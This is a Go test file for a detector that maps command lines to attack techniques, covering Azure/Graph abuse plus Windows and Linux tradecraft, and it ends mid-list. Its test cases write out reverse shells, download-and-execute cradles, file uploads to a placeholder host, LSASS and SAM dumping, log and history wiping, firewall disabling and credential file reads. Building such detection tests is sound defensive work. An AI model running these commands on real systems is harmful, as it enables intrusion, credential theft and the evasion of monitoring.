package activity

import (
	"reflect"
	"slices"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/get-sybers/slopmop/internal/sift"
)

func names(hits []Hit) []string {
	var out []string
	for _, h := range hits {
		out = append(out, h.Name)
	}
	return out
}

func TestDetect(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	const ga = "62e90394-69f5-4237-9190-012177145e10"
	tests := []struct {
		name string
		line string
		want []string
	}{
		{"ga by template in the url", "Invoke-RestMethod -Method Post -Uri https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=" + ga + "/members/$ref", []string{"GlobalAdministratorAssignment"}},
		{"ga by cmdlet", "New-MgRoleManagementDirectoryRoleAssignment -PrincipalId $sp -RoleDefinitionId " + ga + " -DirectoryScopeId /", []string{"GlobalAdministratorAssignment"}},
		{"ga by name", `Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberObjectId $id`, []string{"GlobalAdministratorAssignment"}},
		{"ga role only read", "Get-MgRoleManagementDirectoryRoleAssignment -Filter \"roleDefinitionId eq '" + ga + "'\"", nil},
		{"ga template listed in an output", "Global Administrator  " + ga + "  Can manage all aspects", nil},
		{"role member by ref", "curl -X POST https://graph.microsoft.com/v1.0/directoryRoles/9b8c/members/$ref -d @body.json", []string{"RoleAssignment"}},
		{"role assignment rest", `requests.post("https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments", json=body)`, []string{"RoleAssignment"}},
		{"role assignments read", "curl -s https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments", []string{"GraphDirectoryEnumeration"}},
		{"azure rbac", `az role assignment create --assignee $APP --role "User Access Administrator" --scope /`, []string{"RoleAssignment"}},
		{"azure rbac list", "az role assignment list --all", nil},
		{"app role rest", "POST https://graph.microsoft.com/v1.0/servicePrincipals/1f2e/appRoleAssignments", []string{"AppRoleAssignment"}},
		{"app role assigned to", `Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$id/appRoleAssignedTo" -Body $b`, []string{"AppRoleAssignment"}},
		{"app role cmdlet", "New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp -PrincipalId $sp -ResourceId $graph -AppRoleId $role", []string{"AppRoleAssignment"}},
		{"app role read", "curl -s https://graph.microsoft.com/v1.0/servicePrincipals/1f2e/appRoleAssignments", []string{"GraphDirectoryEnumeration"}},
		{"consent grant", "az ad app permission admin-consent --id $APP", []string{"AppRoleAssignment"}},
		{"add password rest", "curl -X POST https://graph.microsoft.com/v1.0/applications/77aa/addPassword -d '{}'", []string{"AppCredentialAddition"}},
		{"add password cmdlet", "Add-MgApplicationPassword -ApplicationId $app", []string{"AppCredentialAddition"}},
		{"credential reset", "az ad sp credential reset --id $APP --append", []string{"AppCredentialAddition"}},
		{"token endpoint", "curl -d grant_type=client_credentials https://login.microsoftonline.com/1111/oauth2/v2.0/token", []string{"TokenRequest"}},
		{"cli service principal", "az login --service-principal -u $APP -p $SECRET --tenant $T", []string{"TokenRequest"}},
		{"interactive cli", "az login", nil},
		{"graph sign-in as app", "Connect-MgGraph -TenantId $t -ClientSecretCredential $cred", []string{"TokenRequest"}},
		{"msal", "result = app.acquire_token_for_client(scopes=scope)", []string{"TokenRequest"}},
		{"graph users", "curl -H \"$AUTH\" https://graph.microsoft.com/v1.0/users?$top=999", []string{"GraphDirectoryEnumeration"}},
		{"graph cmdlet", "Get-MgServicePrincipal -All", []string{"GraphDirectoryEnumeration"}},
		{"cli directory", "az ad sp list --all", []string{"GraphDirectoryEnumeration"}},
		{"mailbox rest", "GET https://graph.microsoft.com/v1.0/users/alice@corp.example/messages?$top=50", []string{"MailboxAccess"}},
		{"mailbox cmdlet", "Get-MgUserMessage -UserId $u -All", []string{"MailboxAccess"}},
		{"ews", "https://outlook.office365.com/EWS/Exchange.asmx", []string{"MailboxAccess"}},
		{"teams folder", "https://graph.microsoft.com/v1.0/users/bob/mailFolders/TeamsMessagesData/messages", []string{"TeamsMessageAccess"}},
		{"teams chats", "https://graph.microsoft.com/v1.0/users/bob/chats/getAllMessages", []string{"TeamsMessageAccess"}},
		{"teams channel", "https://graph.microsoft.com/beta/teams/7a/channels/19:abc/messages", []string{"TeamsMessageAccess"}},
		{"sharepoint sites", "https://graph.microsoft.com/v1.0/sites?search=*", []string{"SharePointEnumeration"}},
		{"onedrive", "https://graph.microsoft.com/v1.0/users/bob/drive/root/children", []string{"SharePointEnumeration"}},
		{"sharepoint rest", "https://corp.sharepoint.com/sites/hr/_api/web/lists", []string{"SharePointEnumeration"}},
		{"sharepoint cmdlet", "Get-MgSite -Search '*'", []string{"SharePointEnumeration"}},
		{"secret rest", "curl https://corpvault.vault.azure.net/secrets?api-version=7.4", []string{"KeyVaultSecretRead"}},
		{"secret cli", "az keyvault secret show --vault-name corpvault --name db", []string{"KeyVaultSecretRead"}},
		{"secret cmdlet", "Get-AzKeyVaultSecret -VaultName corpvault", []string{"KeyVaultSecretRead"}},
		{"secret sdk", "value = client.get_secret(name).value", []string{"KeyVaultSecretRead"}},
		{"secret set", "az keyvault secret set --vault-name corpvault --name db --value x", nil},
		{"key list", "curl https://corpvault.vault.azure.net/keys?api-version=7.4", []string{"KeyVaultKeyEnumeration"}},
		{"key unwrap", "POST https://corpvault.vault.azure.net/keys/kek/0a1b/unwrapkey?api-version=7.4", []string{"KeyVaultKeyUnwrap"}},
		{"key unwrap cmdlet", "Invoke-AzKeyVaultKeyOperation -Operation UnwrapKey -VaultName corpvault -Name kek", []string{"KeyVaultKeyUnwrap"}},
		{"vault list", "az keyvault list --query [].name -o tsv", []string{"AzureResourceEnumeration"}},
		{"arm subscriptions", "curl https://management.azure.com/subscriptions?api-version=2022-12-01", []string{"AzureResourceEnumeration"}},
		{"arm write", "curl -X PUT https://management.azure.com/subscriptions/1/resourceGroups/rg?api-version=2022-12-01", nil},
		{"lookalike host", "https://graph.microsoft.com.evil.example/v1.0/users", nil},
		{"unrelated", "nmap -sn 10.20.1.0/24", nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := names(table.Detect(tt.line)); !slices.Equal(got, tt.want) {
				t.Errorf("Detect(%q) = %q, want %q", tt.line, got, tt.want)
			}
		})
	}
}

func TestDetectWindows(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		name string
		line string
		want []string
	}{
		{"certutil fetches", `certutil.exe -urlcache -split -f http://198.51.100.7/a.b64 a.b64`, []string{"FileDownload"}},
		{"certutil hashes", `certutil -hashfile a.bin SHA256`, nil},
		{"certutil exports a key", `certutil -exportPFX -p x My 01 ca.pfx`, []string{"CertificateExport"}},
		{"bits job", `bitsadmin /transfer j /download http://198.51.100.7/b C:\b`, []string{"FileDownload"}},
		{"web client to a file", `(New-Object Net.WebClient).DownloadFile($u, $f)`, []string{"FileDownload"}},
		{"cradle", `IEX (New-Object Net.WebClient).DownloadString($u)`, []string{"FileDownload", "DownloadAndExecute"}},
		{"piped cradle", `irm $u | iex`, []string{"DownloadAndExecute"}},
		{"a plain request", `Invoke-WebRequest $u`, nil},
		{"curl to a file", `curl -s -o /tmp/a.bin http://198.51.100.7/a.bin`, []string{"FileDownload"}},
		{"curl calling an api", `curl -s -H "Authorization: Bearer $T" https://api.example.com/v1/items`, nil},
		{"curl sending a file", `curl -s -X POST --data-binary @loot.zip http://198.51.100.7/up`, []string{"FileUpload"}},
		{"curl piped to a shell", `curl -s http://198.51.100.7/a.sh | bash`, []string{"ShellDownloadAndExecute"}},
		{"wget", `wget http://198.51.100.7/a.bin`, []string{"FileDownload"}},
		{"wget posting a file", `wget --post-file=loot.zip http://198.51.100.7/up`, []string{"FileUpload"}},
		{"requests with a file", `requests.post(url, files={"f": open("loot.zip", "rb")})`, []string{"FileUpload"}},
		{"assembly from bytes", `$asm = [System.Reflection.Assembly]::Load($bytes)`, []string{"ReflectiveCodeLoading"}},
		{"assembly in c#", `Assembly.Load(b).EntryPoint.Invoke(null, null);`, []string{"ReflectiveCodeLoading"}},
		{"p/invoke", `[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);`, []string{"NativeApiCall"}},
		{"compile at run time", `Add-Type -TypeDefinition $src`, []string{"RuntimeCompilation"}},
		{"load a framework type", `Add-Type -AssemblyName System.Web`, nil},
		{"process start", `[System.Diagnostics.Process]::Start("cmd.exe", "/c whoami")`, []string{"ProcessStart"}},
		{"socket", `$tcp = New-Object System.Net.Sockets.TcpClient("198.51.100.9", 443)`, []string{"NetworkSocket"}},
		{"scriptlet", `regsvr32 /s /n /u /i:http://198.51.100.7/x.sct scrobj.dll`, []string{"SignedBinaryProxyExecution"}},
		{"registering a library", `regsvr32 /s C:\Windows\System32\vbscript.dll`, nil},
		{"dll export", `rundll32.exe C:\Users\Public\a.dll,Start`, []string{"SignedBinaryProxyExecution"}},
		{"inline task", `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\b.xml`, []string{"SignedBinaryProxyExecution"}},
		{"run key by reg", `reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v U /d x /f`, []string{"RunKeyPersistence"}},
		{"run key read", `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, []string{"RegistryQuery"}},
		{"bits upload", `bitsadmin /transfer j /upload http://198.51.100.7/in C:\loot.zip`, []string{"FileUpload"}},
		{"web client upload", `$wc.UploadFile($u, "C:\loot.zip")`, []string{"FileUpload"}},
		{"run key by .net", `[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", $true).SetValue("U", "x")`, []string{"RunKeyPersistence"}},
		{"task created", `schtasks.exe /create /tn U /tr x /sc onlogon`, []string{"ScheduledTaskCreation"}},
		{"tasks listed", `schtasks /query /fo list`, nil},
		{"service created", `sc.exe \\dc01 create U binPath= x`, []string{"ServiceCreation"}},
		{"services listed", `sc query`, []string{"ServiceDiscovery"}},
		{"log cleared", `wevtutil cl Security`, []string{"EventLogClearing"}},
		{"log read", `wevtutil qe Security /c:5`, nil},
		{"hive saved", `reg save HKLM\SAM C:\Users\Public\s.hiv`, []string{"RegistryHiveDump"}},
		{"memory dump", `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\l.dmp full`, []string{"SignedBinaryProxyExecution", "LsassDump"}},
		{"scan interface", `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`, []string{"AmsiBypass"}},
		{"ldap search", `$s = New-Object System.DirectoryServices.DirectorySearcher([adsi]"")`, []string{"DirectorySearch"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := names(table.Detect(tt.line)); !slices.Equal(got, tt.want) {
				t.Errorf("Detect(%q) = %q, want %q", tt.line, got, tt.want)
			}
		})
	}
}

// linuxCases are short fragments, with variables where a value would go.
// They also feed the corpus that checks every pattern's literals.
//
//nolint:gochecknoglobals // a table shared by two tests
var linuxCases = []struct {
	line string
	want []string
}{
	{`(crontab -l; echo "$JOB") | crontab -`, []string{"ScheduledJobCreation"}},
	{`crontab jobs.txt`, []string{"ScheduledJobCreation"}},
	{`crontab -l`, nil},
	{`crontab -u svc -e`, []string{"ScheduledJobCreation"}},
	{`echo "$JOB" >> /etc/cron.d/sync`, []string{"ScheduledJobCreation"}},
	{`echo "$F" | at now + 1 minute`, []string{"ScheduledJobCreation"}},
	{`systemd-run --on-calendar=hourly "$F"`, []string{"ScheduledJobCreation"}},
	{`systemctl enable --now sync.timer`, []string{"ScheduledJobCreation"}},
	{`cp sync.service /etc/systemd/system/sync.service`, []string{"SystemdUnitCreation"}},
	{`systemctl enable --now sync.service`, []string{"SystemdUnitCreation"}},
	{`systemctl status sshd`, []string{"ServiceDiscovery"}},
	{`service --status-all`, []string{"ServiceDiscovery"}},
	{`systemctl restart sshd`, nil},
	{`useradd -m -s /bin/bash svc`, []string{"AccountCreation"}},
	{`net user svc "$P" /add`, []string{"AccountCreation"}},
	{`New-LocalUser -Name svc`, []string{"AccountCreation"}},
	{`net user`, nil},
	{`echo "$KEY" >> ~/.ssh/authorized_keys`, []string{"SshKeyPersistence"}},
	{`ssh-copy-id -i k.pub user@10.0.0.5`, []string{"SshKeyPersistence"}},
	{`cat ~/.ssh/authorized_keys`, nil},
	{`echo "$LINE" >> ~/.bashrc`, []string{"ShellProfilePersistence"}},
	{`echo "$LINE" >> ~/.profile`, []string{"ShellProfilePersistence"}},
	{`source ~/.bashrc`, nil},

	{`echo "$RULE" >> /etc/sudoers.d/svc`, []string{"SudoersModification"}},
	{`echo 'svc ALL=(ALL) NOPASSWD: ALL' | tee rule`, []string{"SudoersModification"}},
	{`cat /etc/sudoers`, nil},
	{`chmod u+s "$F"`, []string{"SetuidBit"}},
	{`chmod 4755 /tmp/tool`, []string{"SetuidBit"}},
	{`chmod 755 run.sh`, nil},
	{`docker run --privileged -it alpine sh`, []string{"ContainerEscape"}},
	{`docker run -v /:/host alpine ls /host`, []string{"ContainerEscape"}},
	{`nsenter -t 1 -m -u -i -n sh`, []string{"ContainerEscape"}},
	{`curl --unix-socket /var/run/docker.sock http://localhost/containers/json`, []string{"ContainerEscape"}},
	{`docker ps`, nil},
	{`insmod ./mod.ko`, []string{"KernelModuleLoad"}},
	{`modprobe mod`, []string{"KernelModuleLoad"}},
	{`modprobe -r mod`, nil},
	{`LD_PRELOAD=/tmp/x.so id`, []string{"DynamicLinkerHijack"}},
	{`echo /tmp/x.so > /etc/ld.so.preload`, []string{"DynamicLinkerHijack"}},
	{`find / -perm -4000 -type f 2>/dev/null`, []string{"SetuidFileSearch"}},
	{`find / -perm -u=s -type f`, []string{"SetuidFileSearch"}},
	{`find / -name '*.conf'`, nil},

	{`cat /etc/shadow > s.txt`, []string{"ShadowFileRead"}},
	{`unshadow p s > u`, []string{"ShadowFileRead"}},
	{`cat /etc/passwd`, nil},
	{`cat ~/.ssh/id_rsa`, []string{"PrivateKeyRead"}},
	{`cp /etc/ssh/ssh_host_rsa_key .`, []string{"PrivateKeyRead"}},
	{`cat ~/.ssh/id_rsa.pub`, nil},
	{`cat ~/.aws/credentials`, []string{"CredentialFileRead"}},
	{`cat ~/.config/gcloud/credentials.db`, []string{"CredentialFileRead"}},
	{`cat ~/.azure/accessTokens.json`, []string{"CredentialFileRead"}},
	{`cp ~/.kube/config .`, []string{"CredentialFileRead"}},
	{`cat ~/.docker/config.json`, []string{"CredentialFileRead"}},
	{`cat ~/.netrc`, []string{"CredentialFileRead"}},
	{`grep -i token ~/.bash_history`, []string{"ShellHistoryRead"}},
	{`curl -s http://169.254.169.254/latest/meta-data/`, []string{"CloudMetadataAccess"}},
	{`curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/`, []string{"CloudMetadataAccess"}}, //nolint:misspell // the header is spelled so
	{`gcore -o dump "$PID"`, []string{"ProcessMemoryDump"}},
	{`cat /proc/$PID/maps`, []string{"ProcessMemoryDump"}},
	{`kubectl get secrets -A -o yaml`, []string{"ClusterSecretRead"}},
	{`cat /var/run/secrets/kubernetes.io/serviceaccount/token`, []string{"ClusterSecretRead"}},
	{`curl -sk "$API/api/v1/namespaces/default/secrets"`, []string{"ClusterSecretRead"}},
	{`kubectl get pods`, nil},

	{`rm -f /var/log/auth.log`, []string{"LogDeletion"}},
	{`: > /var/log/wtmp`, []string{"LogDeletion"}},
	{`journalctl --vacuum-time=1s`, []string{"LogDeletion"}},
	{`tail /var/log/syslog`, nil},
	{`history -c`, []string{"HistoryClearing"}},
	{`rm -f ~/.bash_history`, []string{"HistoryClearing"}},
	{`cat /dev/null > ~/.bash_history`, []string{"HistoryClearing"}},
	{`ln -sf /dev/null ~/.bash_history`, []string{"HistoryClearing"}},
	{`unset HISTFILE`, []string{"HistoryDisabling"}},
	{`export HISTFILE=/dev/null`, []string{"HistoryDisabling"}},
	{`export HISTSIZE=0`, []string{"HistoryDisabling"}},
	{`set +o history`, []string{"HistoryDisabling"}},
	{`setenforce 0`, []string{"SecurityToolDisabling"}},
	{`systemctl stop auditd`, []string{"SecurityToolDisabling"}},
	{`service rsyslog stop`, []string{"SecurityToolDisabling"}},
	{`auditctl -e 0`, []string{"SecurityToolDisabling"}},
	{`pkill -9 auditd`, []string{"SecurityToolDisabling"}},
	{`systemctl status auditd`, []string{"ServiceDiscovery"}},
	{`iptables -F`, []string{"FirewallDisabling"}},
	{`iptables -P INPUT ACCEPT`, []string{"FirewallDisabling"}},
	{`ufw disable`, []string{"FirewallDisabling"}},
	{`nft flush ruleset`, []string{"FirewallDisabling"}},
	{`systemctl disable --now firewalld`, []string{"FirewallDisabling"}},
	{`Set-NetFirewallProfile -All -Enabled False`, []string{"FirewallDisabling"}},
	{`netsh advfirewall set allprofiles state off`, []string{"FirewallDisabling"}},
	{`iptables -L -n`, nil},
	{`touch -r /bin/ls "$F"`, []string{"Timestomp"}},
	{`touch --date="2020-01-01" "$F"`, []string{"Timestomp"}},
	{`touch new.txt`, nil},

	{`exec 3<>/dev/tcp/$H/$PORT`, []string{"ReverseShell"}},
	{`ncat "$H" "$PORT" -e "$SH"`, []string{"ReverseShell"}},
	{`nc "$H" "$PORT" -e /bin/sh`, []string{"ReverseShell"}},
	{`socat tcp:$H:$PORT exec:$SH`, []string{"ReverseShell"}},
	{`pty.spawn(shell)`, []string{"ReverseShell"}},
	{`nc -zv 10.0.0.5 22`, nil},
	{`curl -fsSL "$U" | sudo bash`, []string{"ShellDownloadAndExecute"}},
	{`wget -qO- "$U" | python3`, []string{"ShellDownloadAndExecute"}},
	{`bash -c "$(curl -fsSL "$U")"`, []string{"ShellDownloadAndExecute"}},
	{`bash <(curl -s "$U")`, []string{"ShellDownloadAndExecute"}},
	{`source <(curl -s "$U")`, []string{"ShellDownloadAndExecute"}},
	{`eval "$(wget -qO- "$U")"`, []string{"ShellDownloadAndExecute"}},
	{`curl -s "$U" | jq .`, nil},
	{`tar czf out.tgz dir/`, []string{"ArchiveCreation"}},
	{`zip -r out.zip dir`, []string{"ArchiveCreation"}},
	{`7z a out.7z dir`, []string{"ArchiveCreation"}},
	{`Compress-Archive -Path d -DestinationPath o.zip`, []string{"ArchiveCreation"}},
	{`tar --create --file out.tar dir`, []string{"ArchiveCreation"}},
	{`tar -z -c -f out.tar.gz dir`, []string{"ArchiveCreation"}},
	{`zip -r out dir`, []string{"ArchiveCreation"}},
	{`"C:\Program Files\7-Zip\7z.exe" a -pX out.7z dir`, []string{"ArchiveCreation"}},
	{`7za a -tzip out.zip dir`, []string{"ArchiveCreation"}},
	{`rar a out.rar dir`, []string{"ArchiveCreation"}},
	{`gzip -9 dump.sql`, []string{"ArchiveCreation"}},
	{`mysqldump db | gzip > dump.sql.gz`, []string{"ArchiveCreation"}},
	{`pg_dump db | xz -9 > dump.sql.xz`, []string{"ArchiveCreation"}},
	{`makecab loot.txt loot.cab`, []string{"ArchiveCreation"}},
	{`Compress-7Zip -Path d -ArchiveFileName o.7z`, []string{"ArchiveCreation"}},
	{`[IO.Compression.ZipFile]::CreateFromDirectory($src, $dst)`, []string{"ArchiveCreation"}},
	{`shutil.make_archive("out", "zip", "dir")`, []string{"ArchiveCreation"}},
	{`zipfile.ZipFile("out.zip", "w")`, []string{"ArchiveCreation"}},
	{`tarfile.open("out.tar.gz", "w:gz")`, []string{"ArchiveCreation"}},
	{`tar cf - /srv | ssh ops@10.0.0.5 'cat > srv.tar'`, []string{"ArchiveCreation"}},
	{`find /srv -name '*.bak' -exec gzip {} \;`, []string{"ArchiveCreation"}},
	{`tar xzf out.tgz`, nil},
	{`# the tar command packs the folder`, nil},
	{`# compress with gzip before encoding`, nil},
	{`# WinRAR a popular archiver`, nil},
	{`gzip -d dump.sql.gz`, nil},
	{`gzip -dc dump.sql.gz | head`, nil},
	{`7z x out.7z`, nil},
	{`unzip out.zip`, nil},
}

func TestDetectLinux(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	for _, tt := range linuxCases {
		t.Run(tt.line, func(t *testing.T) {
			if got := names(table.Detect(tt.line)); !slices.Equal(got, tt.want) {
				t.Errorf("Detect(%q) = %q, want %q", tt.line, got, tt.want)
			}
		})
	}
}

func TestDetectCountsLinesOnce(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	text := strings.Join([]string{
		"az keyvault secret show --vault-name a --name x",
		"curl https://a.vault.azure.net/secrets/x && az keyvault secret show --vault-name a --name x",
		"echo done",
		"Get-AzKeyVaultSecret -VaultName b",
	}, "\r\n")
	hits := table.Detect(text)
	if len(hits) != 1 || hits[0].Name != "KeyVaultSecretRead" || hits[0].Lines != 3 {
		t.Errorf("hits = %+v, want KeyVaultSecretRead on 3 lines", hits)
	}
	if !slices.Equal(hits[0].Tactics, []string{"CredentialAccess"}) {
		t.Errorf("tactics = %q, want CredentialAccess", hits[0].Tactics)
	}
}

func TestDetectKeepsTableOrder(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	text := "az keyvault list\nAdd-MgApplicationPassword -ApplicationId $a\n"
	if got, want := names(table.Detect(text)), []string{"AppCredentialAddition", "AzureResourceEnumeration"}; !slices.Equal(got, want) {
		t.Errorf("Detect = %q, want %q", got, want)
	}
	hits := table.Detect(text)
	if !slices.Equal(hits[0].Attack, []string{"T1098.001"}) || !slices.Equal(hits[1].Attack, []string{"T1580"}) {
		t.Errorf("techniques = %q and %q, want those of the data file", hits[0].Attack, hits[1].Attack)
	}
	visited := 0
	table.Each(func(name string, tactics, attack []string) {
		visited++
		if name == "" || len(tactics) == 0 || len(attack) == 0 {
			t.Errorf("Each gave %q with tactics %q and techniques %q", name, tactics, attack)
		}
	})
	if visited != len(table.Names()) {
		t.Errorf("Each visited %d activities of %d", visited, len(table.Names()))
	}
	if got := table.Detect(""); got != nil {
		t.Errorf("Detect of nothing = %+v, want none", got)
	}
}

func TestTactics(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	got := table.Tactics()
	for _, want := range []string{"PrivilegeEscalation", "InitialAccess", "Collection", "CredentialAccess"} {
		if !slices.Contains(got, want) {
			t.Errorf("Tactics() = %q, lacks %s", got, want)
		}
	}
	sorted := slices.Clone(got)
	slices.Sort(sorted)
	if len(slices.Compact(sorted)) != len(got) {
		t.Errorf("Tactics() = %q, has a duplicate", got)
	}
}

func TestDetectInContext(t *testing.T) {
	table, err := LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	const ga = "62e90394-69f5-4237-9190-012177145e10"
	tests := []struct {
		name string
		text string
		want []string
	}{
		{
			"powershell escapes the dollar of $ref",
			"Invoke-RestMethod -Method Post -Uri \"https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=" + ga + "/members/`$ref\"",
			[]string{"GlobalAdministratorAssignment"},
		},
		{
			"an address built by concatenation",
			`requests.get("https://graph.microsoft.com/v1.0/users/" + user + "/messages?$top=500")`,
			[]string{"MailboxAccess"},
		},
		{
			"the host held in a variable",
			"GRAPH = \"https://graph.microsoft.com/v1.0\"\nr = requests.get(f\"{GRAPH}/users/{uid}/mailFolders\")\ns = requests.get(GRAPH + \"/sites?search=*\")\nu = requests.get(f\"{GRAPH}/users\")\n",
			[]string{"GraphDirectoryEnumeration", "MailboxAccess", "SharePointEnumeration"},
		},
		{
			"the same paths without the host anywhere",
			"r = requests.get(f\"{BASE}/users/{uid}/mailFolders\")\ns = requests.get(BASE + \"/sites?search=*\")\n",
			nil,
		},
		{
			"a file path is not a graph path",
			"GRAPH=https://graph.microsoft.com/v1.0\ncp /Users/bob/notes.txt C:/Users/bob/out\n",
			nil,
		},
		{
			"a curl command continued over lines",
			"curl -s -X POST \\\n  -H \"Authorization: Bearer $T\" \\\n  https://graph.microsoft.com/v1.0/servicePrincipals/$SP/appRoleAssignments\n",
			[]string{"AppRoleAssignment"},
		},
		{
			"a powershell command continued over lines",
			"Invoke-RestMethod -Method Post `\r\n  -Uri \"$graph/applications/$app/addPassword\"\r\n",
			[]string{"AppCredentialAddition"},
		},
		{
			"the vault held in a variable",
			"VAULT=https://corpvault.vault.azure.net\ncurl \"$VAULT/secrets?api-version=7.4\"\ncurl \"$VAULT/keys?api-version=7.4\"\n",
			[]string{"KeyVaultSecretRead", "KeyVaultKeyEnumeration"},
		},
		{
			"a local secrets folder beside a vault",
			"VAULT=https://corpvault.vault.azure.net\ncat /run/secrets/db ~/.ssh/keys\n",
			nil,
		},
		{
			"the token endpoint with the tenant in a variable",
			"curl -d grant_type=client_credentials \"https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token\"",
			[]string{"TokenRequest"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := names(table.Detect(tt.text)); !slices.Equal(got, tt.want) {
				t.Errorf("Detect(%q) = %q, want %q", tt.text, got, tt.want)
			}
		})
	}
}

func TestDecodeRejects(t *testing.T) {
	one := func(fields string) string {
		return `{"contexts":{"c":"x"},"activities":[{"name":"A","tactics":["T"],"attack":["X"],` + fields + `}]}`
	}
	if _, err := decode([]byte(one(`"patterns":["a"]`))); err != nil {
		t.Fatalf("the smallest valid table: %v", err)
	}
	if _, err := decode([]byte(one(`"context":"c","paths":["a"]`))); err != nil {
		t.Fatalf("a table of paths only: %v", err)
	}
	tests := map[string]string{
		"not json":                        `{`,
		"no activities":                   `{"contexts":{},"activities":[]}`,
		"trailing data":                   one(`"patterns":["a"]`) + ` x`,
		"unknown field":                   one(`"patterns":["a"],"extra":1`),
		"empty name":                      `{"activities":[{"name":"","tactics":["T"],"attack":["X"],"patterns":["a"]}]}`,
		"named twice":                     `{"activities":[{"name":"A","tactics":["T"],"attack":["X"],"patterns":["a"]},{"name":"A","tactics":["T"],"attack":["X"],"patterns":["b"]}]}`,
		"no tactics":                      `{"activities":[{"name":"A","tactics":[],"patterns":["a"]}]}`,
		"no technique":                    `{"activities":[{"name":"A","tactics":["T"],"patterns":["a"]}]}`,
		"no patterns":                     one(`"patterns":[]`),
		"bad pattern":                     one(`"patterns":["("]`),
		"bad path":                        one(`"context":"c","paths":["("]`),
		"bad unless":                      one(`"patterns":["a"],"unless":"("`),
		"bad context":                     `{"contexts":{"c":"("},"activities":[{"name":"A","tactics":["T"],"attack":["X"],"patterns":["a"]}]}`,
		"paths, no context":               one(`"paths":["a"]`),
		"context, no paths":               one(`"patterns":["a"],"context":"c"`),
		"an unknown context":              one(`"context":"d","paths":["a"]`),
		"a subject without a label":       one(`"patterns":["a"],"subjects":[{"pattern":"(a)"}]`),
		"a subject without a group":       one(`"patterns":["a"],"subjects":[{"label":"l","pattern":"a"}]`),
		"a subject with two groups":       one(`"patterns":["a"],"subjects":[{"label":"l","pattern":"(a)(b)"}]`),
		"a subject that does not compile": one(`"patterns":["a"],"subjects":[{"label":"l","pattern":"("}]`),
		"a literal with a line break":     one(`"patterns":["first\\nsecond"]`),
	}
	for name, data := range tests {
		t.Run(name, func(t *testing.T) {
			if _, err := decode([]byte(data)); err == nil {
				t.Errorf("decode(%s) gave no error", data)
			}
		})
	}
}

// corpus holds a line for every pattern of the table: what the checks of the
// literals read.
func corpus() []string {
	lines := []string{
		"Invoke-RestMethod -Method Post -Uri https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/$ref",
		`ADD-MSOLROLEMEMBER -RoleName "Company Administrator"`,
		"62e90394-69f5-4237-9190-012177145e10 given by role assignment", "Global Administrator role assignment",
		"New-MgRoleManagementDirectoryRoleAssignment -RoleDefinitionId 62e90394-69f5-4237-9190-012177145e10",
		"-Uri $g/roleManagement/directory/roleAssignments -Method Post", "$g/servicePrincipals/1/appRoleAssignments -Body $b",
		"NEW-AZROLEASSIGNMENT -ObjectId $id", "AZ ROLE ASSIGNMENT CREATE --role Owner",
		"curl --data @b https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments",
		"POST /v1.0/servicePrincipals/1/appRoleAssignedTo", "New-MgOauth2PermissionGrant", "az ad app permission grant",
		"servicePrincipals/1/addKey", "New-AzADSpCredential", "az ad sp credential reset",
		"https://LOGIN.MICROSOFTONLINE.COM/t/oauth2/token", "az login -u a --service-principal",
		"Connect-AzAccount -ServicePrincipal", "ClientSecretCredential(t, c, s)",
		"Get-AzureADUser", "az ad user list", "GRAPH/users", "GRAPH/groups", "x/roleManagement",
		"Get-MgUserMailFolderMessage", "outlook.office.com/api/v2.0/me", "Search-Mailbox", "/me/mailFolders", "/users/1/messages",
		"TEAMSMESSAGESDATA", "chats/getAllMessages", "Get-MgChatMessage", "/chats/19:x/messages",
		"corp.sharepoint.com/_api/web", "Get-MgDriveItem", "Get-PnPListItem", "/sites", "/drive",
		"x.vault.azure.net/secrets", "az keyvault secret download", "Backup-AzKeyVaultSecret", "list_properties_of_secrets(", "/secrets?api-version=7.4",
		"/keys/k/v/decrypt", "az keyvault key decrypt", "Invoke-AzKeyVaultKeyOperation -Operation Decrypt", "c.unwrap_key(",
		"x.vault.usgovcloudapi.net/keys", "az keyvault key show", "Get-AzKeyVaultKey", "list_properties_of_keys(", "/keys?api-version=7.4",
		"management.azure.com/subscriptions", "az storage account list", "az graph query", "Get-AzResourceGroup", "/subscriptions?api-version=1",
		"certutil -urlcache x", "bitsadmin /transfer j", "Start-BitsTransfer -Source x", "$w.DownloadFile(u, f)",
		"Invoke-WebRequest u -OutFile f", "iwr u -OutFile f", "curl u -o f", "$c = [HttpClient]::new(); $c.GetStringAsync(u)", "[WebRequest]::Create(u)",
		"IEX $w.DownloadString(u)", "$w.DownloadString(u) | iex", "Invoke-RestMethod u | iex", "iwr u | iex", "irm u | iex",
